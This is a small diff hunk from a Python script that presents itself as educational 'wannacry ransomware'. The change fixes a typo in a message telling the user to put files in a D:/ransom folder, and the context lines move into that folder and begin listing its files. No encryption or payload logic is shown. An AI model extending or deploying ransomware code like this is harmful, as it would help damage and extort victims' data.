@@ -12,7 +12,7 @@ print(colored(f.renderText('wannacry'),'blue'))
 print(colored(f.renderText('ransomware'),'red'))
 print(Fore.BLUE+'Github : https://github.com/WIZARD00007/')
 print(Fore.RED +'caution :ONLY FOR EDUCATIONAL PURPOSE')
-print(Fore.RED +'create/add files insidean ransom directory in D drive (ex: D:/ransom)')
+print(Fore.RED +'create/add files inside ransom directory in D drive (ex: D:/ransom)')
 os.chdir('D:/ransom')
 files=[]
 for file in os.listdir():
